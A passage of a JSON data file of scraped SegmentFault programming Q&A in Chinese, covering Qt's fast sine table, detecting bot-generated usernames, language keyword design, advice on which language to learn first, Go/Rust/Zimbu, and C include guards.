qreal(-0.93299279883473907),\n    qreal(-0.92387953251128663),\n    qreal(-0.91420975570353058),\n    qreal(-0.90398929312344334),\n    qreal(-0.89322430119551532),\n    qreal(-0.88192126434835505),\n    qreal(-0.87008699110871146),\n    qreal(-0.85772861000027223),\n    qreal(-0.84485356524970723),\n    qreal(-0.83146961230254546),\n    qreal(-0.81758481315158404),\n    qreal(-0.80320753148064528),\n    qreal(-0.78834642762660612),\n    qreal(-0.77301045336273688),\n    qreal(-0.75720884650648457),\n    qreal(-0.74095112535495911),\n    qreal(-0.724247082951467),\n    qreal(-0.70710678118654768),\n    qreal(-0.68954054473706716),\n    qreal(-0.67155895484701866),\n    qreal(-0.65317284295377709),\n    qreal(-0.63439328416364593),\n    qreal(-0.61523159058062737),\n    qreal(-0.59569930449243325),\n    qreal(-0.57580819141784523),\n    qreal(-0.55557023301960218),\n    qreal(-0.53499761988709726),\n    qreal(-0.51410274419322188),\n    qreal(-0.49289819222978426),\n    qreal(-0.47139673682599792),\n    qreal(-0.44961132965460698),\n    qreal(-0.42755509343028253),\n    qreal(-0.40524131400499042),\n    qreal(-0.38268343236509039),\n    qreal(-0.359895036534988),\n    qreal(-0.33688985339222),\n    qreal(-0.31368174039889152),\n    qreal(-0.2902846772544625),\n    qreal(-0.26671275747489859),\n    qreal(-0.24298017990326418),\n    qreal(-0.21910124015687016),\n    qreal(-0.19509032201612872),\n    qreal(-0.17096188876030177),\n    qreal(-0.14673047445536239),\n    qreal(-0.12241067519921603),\n    qreal(-0.098017140329560506),\n    qreal(-0.073564563599667412),\n    qreal(-0.049067674327418091),\n    qreal(-0.024541228522912448)\n};</code></pre>\n<p>这段代码看意思应该是近似计算会很快，但是没看懂具体是为什么可以这么算，文档也没有关于这个函数的介绍……求指点一波……</p>\n</div>",
      "favourite": "1",
      "glance": "511",
      "tags": [
        "c++",
        "qt"
      ],
      "time": "2015-12-08",
      "title": "Qt中的qFastSin原理",
      "url": "https://segmentfault.com/q/1010000004115761"
    }
  ],

  "c": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000209626\">\n<p>是啊别去考虑怎么验证是否随机了，基于既有算法作判断的话人家换一个算法不同的注册机你就判断不了了……</p>\n<p>还是想想如何在注册时增加必须手工操作无法AI代替的步骤吧……</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000242434\">\n<p>為何ip可以偽造?! server判斷是不是要改一下</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000209569\">\n<p>你要解决的问题是：「如何防止恶意注册？」</p>\n<p>1、无法判断一个字符串是否为随机。因为现在随机只是一个物理概念，而无法用数学的语言来定义。</p>\n<p>2、防止恶意注册用的最多的办法就是<strong>验证码</strong>。</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000209222\">\n<p>最近在处理一个问题的时候发现，有不少用户使用了发贴机或注册机来进行恶意注册。\n这些用户混淆在正常用户中间，cookie,ip均为伪造，没有更好的特征。</p>\n<p>经过观察，发现这些用户名一般都是随机生成，长度近似，但不知道是否有什么好的算法来识别一个字符串是否是随机生成的？</p>\n<p>求解。</p>\n</div>",
      "favourite": "1",
      "glance": "3.8k",
      "tags": [
        "c++",
        "c",
        "php",
        "字符串处理"
      ],
      "time": "2013-06-04",
      "title": "如何判断一个字符串是随机生成的而不是手写的？",
      "url": "https://segmentfault.com/q/1010000000209222"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000668437\">\n<p><code>function</code>是个标记，表明正在声明的是一个函数，这个关键字和编译型或解释型没什么太大关系，使用这个关键字的大多是<strong>动态类型</strong>语言，对于C/JAVA这一类<strong>静态类型</strong>语言，标明返回值和参数列表就可以明确的区分<strong>函数声明</strong>和<strong>函数调用</strong>，因为函数本身和参数都标明了类型，但动态类型的语言没有类型表示，如果不加入一个特定的关键字，从语法上就不太好区分<strong>函数声明</strong>和<strong>函数调用</strong>，比如C语言中：<br><code>int f(int n)</code>是一个声明，<code>f(n)</code>是一个调用，但在JavaScript中，如果你不加<code>function</code>这个关键字，你该如何解释<code>f(n)</code>到底是什么呢？</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000670780\">\n<p>问一个问题, 请问 \"打\" 的正确含义是什么?</p>\n<p>任何人都不应该给出正确的答案, 因为你不知道它被作为动词还是量词, 或者其他意思.</p>\n<p>所以我们需要从 \"一打\" \"打手\" \"打开\" 这样的上下文中分析该词的含义.</p>\n<p>至于 function 这个关键词需不需要出现, 取决于语言的设计.</p>\n<p>合格的程序员都知道代码文本, 经过编译之后, 最终成为机器码或者 vm 用的字节码, 所以跟你写不写 <code>function</code> 没有关系. <code>function</code> 之类的关键字方便在编译前的分析阶段, 能够正确(并且实现上不那么费力)地通过语法和语义分析.</p>\n<p>举个例子, 在 5.4 之前, php 不支持 <code>abc()[1]</code> 这种对函数返回值取数组索引(前提是得保证返回了理想长度的数组), 鸟哥给的原因(记不清了,估计是他)是解析代码比较乱, 比较难实现, 到 5.4, 总算有人愿意干这个脏活了, 解决了这个问题. 如果哪天谁把 function 这个关键字的解析工作优化了, 那么可能就会出现一个不需要 <code>function</code> 关键字的 php.</p>\n<p>举个栗子, 因为语法被很多人讨厌的 bash<br>\n函数定义如下</br></p>\n<pre><code> [ function ] name () compound-command [ redirections ]\n</code></pre>\n<p>定义函数的的时候, <code>function</code> 关键字是可选的, 但, 没有 <code>function</code> 的时候, 需要写上 <code>()</code><br>\n所以, 意味着 bash 通过 function 或者 () 来定位这是一个函数声明, 而不是语句.</br></p>\n<p>更加准确的回答, 需要从语言的解析具体实现进行分析, 另外还要确定是否存在和 <code>abc(){}</code> 冲突的特性存在, 就不继续深入了</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000668560\">\n<p>很赞的一个问题。</p>\n<p>我也看过很多语言源代码，也对不同的语言的语法感兴趣，所以简单的聊聊这个问题。</p>\n<p>首先出场的是 LISP 语言。 LISP 语言以逼格高闻名于世。他属于函数式编程语言，所有的语句都是函数，因此不需要 function 这个关键词。</p>\n<p>随后的 Fortran 语言，公式翻译的意思 <strong>For</strong>mula<strong>Tran</strong>slation。既然是公式翻译语言，因此 数学公式 f(x) = a + b 在 Fortran 的调用就是 <code>x = a + b</code>。</p>\n<p>在定义函数的方式上，使用 function：（代码来自google）</p>\n<pre><code class=\"lang-fortran\">function add(a, b)\nimplicit none\nreal::a, b    !声明函数参数类型，这是必需的\nreal::add     !声明函数返回值类型，这是必需的\nadd = a + b   !返回值的表达式\nreturn\nend\n</code></pre>\n<p>COBOL语言。COBOL 设计的目的和 Fortran 不同，甚至连赋值语句都没有，而且根本就没有函数的概念，取而代之的是 PROCEDURE DIVISION（过程）。</p>\n<p>随后就是 Basic：<strong>B</strong>eginner's <strong>A</strong>ll-purpose <strong>S</strong>ymbolic <strong>I</strong>nstruction <strong>C</strong>ode。Basic 可谓是集大成者，不仅仅有函数，还有过程。函数使用 function， 过程使用 sub。（抄袭 fortran 和 cobol？）</p>\n<p>C语言改变了这种局面，原因是C语言的一个独辟蹊径的设计理念：函数如何调用，就如何声明。也就是说，我们如果这样调用函数</p>\n<pre><code>sum = f(a, b);\n</code></pre>\n<p>那么，我们就这么声明：</p>\n<pre><code>double f(a, b)     /* 旧式语法 */\n    double a;\n    double b;\n{}\n\ndouble f(double a, double b)  // 新式语法\n{}\n</code></pre>\n<p>随后的 C++ Java C# 走的是C的路线。</p>\n<p>但是<strong>调用和声明一致</strong>的前提是，函数调用之前需要声明。在 C 语言中，不仅仅是函数，即使数据类型定义也需要声明。</p>\n<p>不过在很多动态语言中，大部分数据和函数都不需要提前声明，而且有很多函数只调用一次，那么在函数调用之前声明一次，以后这个函数就再不使用了，这样就会显得繁琐。这时，就需要在语法上将函数定义和函数调用分别出来。</p>\n<p>还有一个原因，C是种编译性的语言，他的语法是为了更好的提升编译速度和编译完成后的代码性能，比如早期C和pascal编译器要求的数据和代码分离的原则。</p>\n<p>而现在的主要动态编程语言都不再需要编译，更无需预编译。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000668429\">\n<p>我看了很多语言源代码，突然发现一个有趣的现象，对于<code>function</code>这个关键字，很多语言设计出来了，而很多语言却没有。这是基于一种什么考虑呢？</p>\n<p>而且经过我的统计，出现<code>function</code>关键字的大多数是脚本语言，比如<code>php</code>,<code>js</code>等等，而编译式语言比如<code>java</code>,<code>c</code>等等，往往却没有用到这个关键字，这其中有什么内在联系吗？</p>\n</div>",
      "favourite": "12",
      "glance": "3.3k",
      "tags": [
        "编程语言",
        "php",
        "javascript",
        "java",
        "c"
      ],
      "time": "2014-09-15",
      "title": "为何有的语言要声明function关键字，有的却不需要呢？",
      "url": "https://segmentfault.com/q/1010000000668429"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000214551\">\n<p>说说我的看法，一家之言，仅供参考。 </p>\n<p>我在学校读书的时候，最开始接触的是C，仅限于学习。后面又接触了C++，同样是个人兴趣。后来读研的时候，由于实验室项目的需要，重新学习了C++，再后来，出于同样的目的，学了Java。毕业之后，本来打算找C++方面的开发，阴差阳错，进入现在的公司，工作中又是Java服务器端开发。工作之余，随着个人兴趣，又学了Python，Scala，JS，但仅限于自己做做自己感兴趣的东西。  </p>\n<p>啰嗦了这么一大堆，只是为了以自己亲身经历说明了一个观点：学习语言的时候，不要纠结着自己到底是学A还是学B，重要的是带着目标，或者说需求去学，目标驱动是最有效的！  </p>\n<p>此外，看了你的评论说第一门语言很重要。对于第一门语言是否重要，我的观点是：是很重要，但不起决定性作用，重要的是行动！而且对于你以后想以编程为职业，很大可能你工作的编程语言不是你的第一门语言，而且作为一个coder，你也不应该局限于一门语言！</p>\n<p>最后，如果你还在学校的话，不要仅关注语言，语言只是载体，重要的还是数据结构、算法、编程思想这些本质性的东西。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000240391\">\n<p>先学 C 吧，毕竟是系统语言，对底层涉及的比较多。</p>\n<p>同意 @justjavac 的那句话</p>\n<blockquote>\n<p>越容易掌握的东西，学习的人越多，而且淘汰得越快</p>\n</blockquote>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000240383\">\n<p><strong>程序员之路——一个老程序员对刚上大学的学弟学妹的忠告</strong><br/>\n原文地址：<a href=\"http://blog.csdn.net/justjavac/article/details/7998856\" rel=\"nofollow\">http://blog.csdn.net/justjavac/article/details/7998856</a></p>\n<p><strong>先学C语言</strong></p>\n<p>始终认为，<strong>对一个初学者来说，IT界的技术风潮是不可追赶</strong>。 我时常看见自己的DDMM们把课本扔了，去买些价格不菲的诸如C#, VB.Net 这样的大部头，这让我感到非常痛心。 而许多搞不清指针是咋回事的BBS站友眉飞色舞的讨论C#里面可以不用指针等等则让我觉得好笑。</p>\n<p>C#就象当年的ASP 一样，“忽如一夜春风来，千树万树梨花开”，结果许多学校的信息学院成了“Web 学院”。 96, 97级的不少大学生都去做Web了。当然我没有任何歧视某一行业的意识。 我只是觉得如果他们<strong>把追赶这些时髦技术的时间多花一点在基础的课程上应该是可以走得更远的</strong>。</p>\n<h2>几个误区</h2>\n<p>初学者对C#风潮的追赶其实也只是学习过程中经常遇到的几个误区之一。 我将用一些实际的例子来说明这些现象，你可以按部就班的看看自己是不是属于其中的一种或者几种：</p>\n<h3>认为计算机技术等于编程技术：</h3>\n<p>有些人即使没有这个想法，在潜意识中也有这样的冲动。 让我奇怪的是，许多信息学院的学生也有这样的念头。 认为计算机专业就是编程专业，与编程无关的，或者不太相关课程他统统都不管，极端的学生只要书上没带“编程”两个字他就不看。</p>\n<p>其实编程只是计算机技术应用过程中一种复杂性最低的劳动，这就是为什么<strong>IT业最底层的人是程序员（CODER）</strong>。 计算机技术包括了多媒体，计算机网络，人工智能，模式识别，管理信息系统等等这些方面。 编程工作只是在这些具体技术在理论研究或者工程实践的过程中表达算法的过程。</p>\n<p>编程的人不一定对计算机技术的了解就一定很高。而一个有趣的现象是，不少大师级的计算机技术研究者是不懂编程的。 网上的炒作和现实中良好的工作待遇把编程这种劳动神秘化了。 <strong>其实每一个程序员心里都明白，自己这些东西，学的时候并不比其它专业难，所以自然也不会高档到哪里去</strong>。</p>\n<h3>咬文嚼字的孔已己作风：</h3>\n<p>我见过一本女生的《计算机网络原理》教材，这个女生像小学生一样在书上划满了横杠杠，笔记做得满满的，打印出来一定比教材还厚。 我不明白的是，像计算机网络原理这样的课程有必要做笔记？ 我们的应试教育的确害了不少学生，在上《原理》这一类课程的时候许多学生像学《马列原理》一样逐字背诵记忆。 这乃是我见过的最愚蠢的行为。 <strong>所谓《原理》，即是需要掌握它为什么这样做，学习why，而不是how（怎样做）</strong>。 极端认真的学生背下以太网的网线最大长度，数据帧的长度，每个字段的意义，IP报头的格式等等，但是忘了路由的原则，忘了TCP/IP协议设计的宗旨。 总之许多人花了大量的时间把书背得滚瓜烂熟却等于什么也没学。</p>\n<p>在学习编程的时候这些学生也是这样，他们确切的记得C++语法的各个细节。 看完了C++ 教程后看《<a href=\"http://126.am/rxAhO3\" rel=\"nofollow\">Thinking in C++</a>》（确实是好书），《<a href=\"http://126.am/r5FtZ3\" rel=\"nofollow\">Inside C++</a>》，《C++ reference》，this C++, that C++……， 然后是网上各种各样的关于C++语法的奇闻逸事，然后发现自己又忘了C++的一些语法，最后回头继续恶补…。</p>\n<p>有个师弟就跟我说：“C++太难了，学了这里忘了那里，学了继承忘了模板。”</p>\n<p>我的回答道：“你不去学就容易了”。</p>\n<p>我并没有教坏他，只是告诉他，死抠C++的语法就和孔已己炫耀茴香豆的茴字有几种写法一样毫无意义。 你根本不需要对的C++语法太关心，动手编程就是了，有不记得的地方一查MSDN就立马搞定。 我有个结论就是，<strong>实际的开发过程中对程序语法的了解是最微不足道的知识</strong>。 这是为什么我在为同学用Basic（我以前从没有学过它）写一个小程序的时候，只花了半个小时看了看语法，然后再用半个小时完成了程序， 而一个小时后我又完全忘记了Basic 的所有关键字。</p>\n<h3>不顾基础，盲目追赶时髦技术：</h3>\n<p>终于点到题目上来了。 大多数的人都希望自己的东西能够马上跑起来，变成钱。 这种想法对一个已经进入职业领域的程序员或者项目经理来说是合理的，而且IT技术进步是如此的快，不跟进就是失业。 但是对于初学者来说（尤其是时间充裕的大中专在校生），这种想法是另人费解的。</p>\n<p>一个并未进入到行业竞争中来的初学者最大的资本便是他有足够的时间沉下心来学习基础性的东西，学习why而不是how。 时髦的技术往往容易掌握，而且越来越容易掌握，这是商业利益的驱使，为了最大化的降低软件开发的成本。 但在IT领域内的现实就是这样，<strong>越容易掌握的东西，学习的人越多，而且淘汰得越快</strong>。 每一次新的技术出来，都有许多初学者跟进，这些初学者由于缺乏必要的基础而使得自己在跟进的过程中花费大量的时间，而等他学会了，这种技术也快淘汰了。</p>\n<p>基础的课程，比方数据结构，操作系统原理等等虽然不能让你立马就实现一个Linux（这是许多人嘲笑理论课程无用的原因）， 但它们能够显著的减少你在学习新技术时学习曲线的坡度。 而且对于许多关键的技术（比方Win32 SDK 程序的设计，DDK的编程）来说甚至是不可或缺的。</p>\n<p>一个活生生的例子是我和我的一个同学，在大一时我还找不到开机按纽，他已经会写些简单的汇编程序了。 我把大二的所有时间花在了汇编，计算机体系结构，数据结构，操作系统原理等等这些课程的学习上，而他则开始学习HTML和VB，并追赶ASP的潮流。 大三的时候我开始学习Windows 操作系统原理，学习SDK编程，时间是漫长的，这时我才能够用VC开发出象模象样的应用程序。 我曾一度因为同学的程序已经能够运行而自己还在学习如何创建对话框而懊恼不已，但临到毕业才发现自己的选择是何等的正确。 和我谈判的公司开出的薪水是他的两倍还多。</p>\n<p>下面有一个不很恰当的比方：假设学习VB编程需要 4个月，学习基础课程和VC的程序设计需要1年。 那么如果你先学VB，再来学习后者，时间不会减少，还是1年，而反过来，如果先学习后者，再来学VB，也许你只需要1个星期就能学得非常熟练。</p>\n<h2>几个重要的基础课程</h2>\n<p>如果你是学生，或者如果你有充足的时间。我建议你仔细的掌握下面的知识。 我的建议是针对那些希望在IT技术上有所成就的初学者。 同时我还列出了一些书目，这些书应该都还可以在书店买到。 说实在的，我在读其他人的文章时最大的心愿就是希望作者列出一个书单。</p>\n<p><strong>大学英语</strong> －不要觉得好笑。我极力推荐这门课程是因为没有专业文档的阅读能力是不可想象的。 中文的翻译往往在猴年马月才会出来，而现在的许多出版社干脆就直接把E文印刷上去。 学习的方法是强迫自己看原版的教材，开始会看不懂，用多了自然熟练。 吃得苦下得狠心绝对是任何行业都需要的品质。</p>\n<p><strong>计算机体系结构和汇编语言</strong> －关于体系结构的书遍地都是，而且也大同小异， 倒是汇编有一本非常好的书《80x86汇编语言程序设计教程》（清华大学出版社，黑色封面，杨季文著）。 你需要着重学习386后保护模式的程序设计。否则你在学习现代操作系统底层的一些东西的时候会觉得是在看天书。</p>\n<p><strong>计算机操作系统原理</strong> －我们的开发总是在特定的操作系统上进行，如果不是，只有一种可能：你在自己实现一个操作系统。 无论如何，操作系统原理是必读的。这就象我们为一个芯片制作外围设备时，芯片基本的工作时序是必需了解的。 这一类书也很多，我没有发现哪一本书非常出众。 只是觉得在看完了这些书后如果有空就应该看看《Inside Windows 2000》(微软出版社，我看的是E文版的，中文的书名想必是Windows 2000 技术内幕之类吧)。 关于学习它的必要性，ZDNET上的另一篇文章已经有过论述。</p>\n<p><strong>数据结构和算法</strong> －这门课程能够决定一个人程序设计水平的高低，是一门核心课程。我首选的是清华版的（朱战立，刘天时）。 很多人喜欢买C++版的，但我觉得没有必要。C++的语法让算法实现过程变得复杂多了，而且许多老师喜欢用模块这一东西让算法变得更复杂。 倒是在学完了C版的书以后再来浏览一下 C++的版的书是最好的。</p>\n<p><strong>软件工程</strong> －这门课程是越到后来就越发现它的重要，虽然刚开始看时就象看马哲一样不知所云。 我的建议是看《实用软件工程》（黄色，清华）。 不要花太多的时间去记条条框框，看不懂就跳过去。 在每次自己完成了一个软件设计任务（不管是练习还是工作）以后再来回顾回顾，每次都会有收获。</p>\n<p><strong>Windows 程序设计</strong> －《北京大学出版社，Petzold著》我建议任何企图设计Windows 程序的人在学习VC以前仔细的学完它。 而且前面的那本《Inside Windows 2000》也最好放到这本书的后面读。 在这本书中，没有C++，没有GUI，没有控件。有的就是如何用原始的C语言来完成Windows 程序设计。 在学完了它以后，你才会发现VC其实是很容易学的。千万不要在没有看完这本书以前提前学习VC，你最好碰都不要碰。 我知道的许多名校甚至都已经用它作为教材进行授课。可见其重要。</p>\n<p>上面的几门课程我认为是必学的重要课程（如果你想做Windows 程序员）。</p>\n<p>对于其它的课程有这样简单的选择方法：<strong>如果你是计算机系的，请学好你所有的专业基础课</strong>。 如果不是，请参照计算机系的课程表。 如果你发现自己看一本书时无法看下去了，请翻到书的最后，看看它的参考文献，找到它们并学习它们，再回头看这本书。 如果一本书的书名中带有“原理”两个字，你一定不要去记忆它其中的细节，你应该以一天至少50页的速度掌握其要领。 尽可能多的在计算机上实践一种理论或者算法。</p>\n<h2>日三省乎己</h2>\n<p>每天读的书太多，容易让人迷失方向。看看我以前整理的<a href=\"http://justjavac.com/other/2012/05/15/qualified-programmer-should-read-what-books.html\" rel=\"nofollow\">一个合格程序员应该看哪些书</a>，如果原文被墙，可以到CSDN看。 一定要在每天晚上想想自己学了些什么，还有些什么相关的东西需要掌握，自己对什么最感兴趣，在一本书上花的时间太长还是不够等等。 同时也应该多想想未来最有可能出现的应用，这样能够让你不是追赶技术潮流而是引领技术潮流。 同时，努力使用现在已经掌握的技术和理论去制作具有一定新意的东西。 坚持这样做能够让你真正成为一个软件“研发者”而不仅仅是一个CODER。</p>\n<h2>把最多的时间花在学习上</h2>\n<p>这是对初学者最后的忠告。 <strong>把每个星期玩CS或者CS的时间压缩到最少</strong>，不玩它们是最好的。 同时，如果你的ASP技术已经能够来钱，甚至有公司请你兼职的话，这就证明你的天分能够保证你在努力的学习之后取得更好的收益，你应该去做更复杂的东西。 <strong>眼光放长远一些</strong>，这无论是对谁都是适用的。</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000213444\">\n<p>想学习编程，但是不知道是学习c开始还是java开始，很纠结！\n各位高手给点建议。</p>\n</div>",
      "favourite": "17",
      "glance": "17.2k",
      "tags": [
        "编程",
        "c",
        "java"
      ],
      "time": "2013-06-15",
      "title": "开始学习编程学习c开始还是java？",
      "url": "https://segmentfault.com/q/1010000000213444"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002716608\">\n<p>这个问题怎么都是负分... 有人来解释一下吗?</p>\n<p>我建议 CoffeeScript, 或者 ES6,<br>\n编写网页是编程人员必备技能, 稍微复杂点的网页就需要用到 JavaScript.<br>\n但是业界普遍认为 JavaScript 优点很多, 缺点比优点多得多,<br>\n所以推荐学习改进版的 CoffeeScript, 或者 ES6.</br></br></br></p>\n<p>教程:<br><a href=\"http://coffee-script.org\" rel=\"nofollow\">http://coffee-script.org</a><br><a href=\"http://javascript.ruanyifeng.com/advanced/ecmascript6.html\" rel=\"nofollow\">http://javascript.ruanyifeng.com/advanced/ecmascript6.html</a></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002719604\">\n<p>你可以现在在线编程网站上试试，比如<a href=\"http://www.hubwiz.com\" rel=\"nofollow\">汇智网</a><a href=\"http://www.hubwiz.com\" rel=\"nofollow\">http://www.hubwiz.com</a>,感觉一下再说。上面有很多课程如c、python、js、nodejs、html、css等等。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002718341\">\n<p>Java C++学一个就好了，都很庞大，你不可能都学好。C和C++其实是不同的语言，不要混为一谈。<br>\n建议再学一门脚本语言（Python、Ruby）和一门函数式语言（Lisp、Scala、Clojure）<br>\n其中Scala和Clojure是基于JVM的，你的Java经验有点能用上。<br>\n我的建议是<br>\nPython-&gt;Java-&gt;c-&gt;Scala (按照这样的先后顺序学习）<br>\n语言学这么多就够了，其他的多学一些框架技术，用于真正的工作吧。</br></br></br></br></br></p>\n</div>",
      "attention": "25",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002716037\">\n<p>我要学习的编程语言有java、C\\C++<br>\n求大家还推荐一门编程语言  作为学校自修课程<br>\n谢谢了。</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "2.1k",
      "tags": [
        "软件开发",
        "c++",
        "c",
        "java",
        "编程语言"
      ],
      "time": "2015-04-29",
      "title": "推荐学习哪门编程语言",
      "url": "https://segmentfault.com/q/1010000002716037"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000311648\">\n<p>你们真的不考虑C++11吗…开发效率并不低…</p>\n<p>另外PHP方面的积累代码有多少？如果多的话，考虑下Facebook的HHVM吧 <a href=\"https://github.com/facebook/hiphop-php/wiki\" rel=\"nofollow\">https://github.com/facebook/hiphop-php/wiki</a></p>\n<p>还有一个Facebook做的PHP的扩展，非常给力…限于NDA就不透露了但是之前传言的是今年下半年开源…</p>\n<p>UPDATE: 才知道两天前Facebook已经对外公布这个PHP扩展了，名字就叫Hack for HipHop</p>\n<p>Hack是一个PHP的static typing变种，目前提供了编译时类型检查，未来提供运行时类型检查。向下兼容普通PHP代码，提供了平滑的从PHP升级到Hack的过渡方案。静态语言最大好处之一，IDE下代码补全功能，Facebook也会提供解决方案。</p>\n<p>Facebook在 #CUFP 上的presentation： OCaml at Facebook via the Hack language <a href=\"http://www.syslog.cl.cam.ac.uk/2013/09/22/liveblogging-cufp-2013/\" rel=\"nofollow\">http://www.syslog.cl.cam.ac.uk/2013/09/22/liveblogging-cufp-2013/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000313756\">\n<p>Zimbu 头一次听说，\n太冷门的估计不会有戏。</p>\n<p>要是我的话会选择Go。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000311213\">\n<p>如果单纯从兴趣和研究的角度来说，可以关注一下 Rust、Zimbu。但是如果是大规模的应用于生产坏境，个人建议还是 Golang 靠谱一点。毕竟生产坏境还是需要实际项目检验的。</p>\n<p>三个对比建议分项目列一个表格：</p>\n<ol>\n<li><p>语法上</p></li>\n<li><p>安装配置和运行上</p></li>\n<li><p>文档上</p></li>\n<li><p>社区活跃度上</p></li>\n<li><p>跟你的应用契合度上</p></li>\n</ol>\n<p>分这几个层面打分，然后你就知道选什么最适合你的项目了。</p>\n<p>PS:很多原本是PHP写的后端服务全部转换成一种新的编译型语言，为了提升性能和利用并发处理。这句话看起来背后隐藏了很多细节，建议动手之前慎重评估一下可行性。</p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000311193\">\n<p>之所以选这三种语言，是因为这三种比较相似：  </p>\n<ol>\n<li>都是编译型的静态语言  </li>\n<li>都能跨平台运行  </li>\n<li>运行效率都可以，起码好过脚本语言很多，可能会超越已经优化了十几年的jvm  </li>\n<li>有动态语言的开发效率，比C/C++学习难度低很多  </li>\n<li>都有高人在主导开发，相信会做的不错  </li>\n<li>都有可能成为下一代系统级别的编程语言，甚至用来开发操作系统  </li>\n<li>可用来写后端的大量运算服务，压榨服务器性能，在服务器端有很多方面可以替换C/C++  </li>\n</ol>\n<hr/>\n<ol>\n<li>Go：Google公司主导开发，内置GC，但最近读了很多文章在指出GC的弱点，怀疑有GC的语言运行效率会打折扣，始终没办法成为系统级的编程语言。  </li>\n<li>Rust：Mozilla公司主导开发，可以选择是否启用GC，运行效率不会输给C/C++，而开发效率又不错，国内用的好像很少。  </li>\n<li>Zimbu：Vim作者开发，是不是目前只有一个人？比起其他两个，好像势单力薄些。  </li>\n</ol>\n<p>还有一些跨平台在运行效率和开发效率都不错的语言，HaXe、Julia、Opa、Falcon、JVM上的N种语言等，这些跟这几种差别比较大些。    </p>\n<p>现在的服务器端处理要求越来越复杂，单纯的脚本语言已经很难适应业务的需求，要既能照顾开发效率，包括新人的学习接受能力，又要比较快的运行效率。相信各位在开发中也碰到这样的需求吧？    </p>\n<p>我们最近要把很多原本是PHP写的后端服务全部转换成一种新的编译型语言，为了提升性能和利用并发处理，在不是非常仔细研究Go和Rust之后，选择了Go，因为Rust好像还不是很成熟，尤其是教程缺乏，Zimbu就更缺少人关注了，但我们还是很希望有一种编译型的语言能成为我们后端开发的主力语言，因为要涉及大量复杂的运算，在效率方面比较看重，还考虑到开发效率是，所以不可能选择C、C++的，至于JVM上的语言，也不会考虑。   </p>\n<p>希望各位高人能指点一二，非常感谢。  </p>\n</div>",
      "favourite": "7",
      "glance": "18.6k",
      "tags": [
        "c",
        "golang",
        "rust",
        "zimbu",
        "编译型语言"
      ],
      "time": "2013-09-23",
      "title": "请教各位高手，下一代编译型语言Go、Rust、Zimbu的对比？",
      "url": "https://segmentfault.com/q/1010000000311193"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000373018\">\n<p><code>#include</code> 不仅可以包含h文件, 包含其他类型文件也是可以的.<br/>\n的确可以使得生成一个可执行文件包含同一个头文件多次, 我给题主举个拙劣的例子:</p>\n<p>foo.h:</p>\n<pre><code>a = 43;\n</code></pre>\n<p>foo.c:</p>\n<pre><code>static int foo(void)\n{\n    int a;\n#include \"foo.h\"\n    return a;\n}\n\nint main(void)\n{\n    int a;\n    int b;\n\n#include \"foo.h\"\n    b = foo();\n    printf(\"a is %d, b is %d\\n\", a, b);\n    return 0;\n}\n</code></pre>\n<p>假如预处理器自动让头文件只包含一次, 那么变量a将得不到初始化.<br/>\n在实际工程中还是可以见到把一些很庞大的数据放在一个文件, 然后 #include 这个文件的赋值给变量的.<br/>\n另外也有 include 一个 c 文件的例子, 例如 redis.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000491258\">\n<p>还有一个作用，有些时候一个头文件会被其他头文件包含，比如<br>\ntypes.h 被header_a.h 和header_b.h包含，然后一个C文件同时包含header_a.h和header_b.h的时候，如果没有＃ifdef/#define/#endif，那么types.h就会被包含两次，这样在types.h中typedef unsigned int uint32_t;之列的声明也会在同一个c文件中出现2次，编译器会曝出redefinition of typedef 'foobar‘ 之类的warning或者错误。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000372876\">\n<p>1、C/C++ 的函数和变量都可以重复声明。条件判断是为了防止不必要的函数被声明，从而造成冲突。</p>\n<p>他是为了避免重复编译，而不是解决重复声明。</p>\n<p>2、<code>#pragma once</code> 同一个文件不会被编译多次。注意这里所说的 <strong>同一个文件</strong> 是指物理上的一个文件，而不是指内容相同的两个文件。</p>\n<p>C/C++ 没有 Java 那种每个类对应一个文件的规定，所以即使使用了 <code>#pragma once</code> 也应该在头文件里面加上条件判断。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000372829\">\n<p>在C/C++中<code>#include</code>所包含的头文件里面必须显式声明</p>\n<pre><code>#ifndef __HEADER_H_DEFINE__\n#define __HEADER_H_DEFINE__\n\n#endif\n</code></pre>\n<p>或者有些编译器支持</p>\n<pre><code>#pragma once\n</code></pre>\n<p>编译器完全有能力在执行预处理指令<code>#include</code>时使同一个文件只包含一次，但是却没有这么做，为什么？是否有需要包含同一个文件超过一次的情况？</p>\n</div>",
      "favourite": "3",
      "glance": "3.3k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2013-12-30",
      "title": "为什么C/C++的预处理指令#include不自动让所包含的文件只包含一次？",
      "url": "https://segmentfault.com/q/1010000000372829"
    },
    {
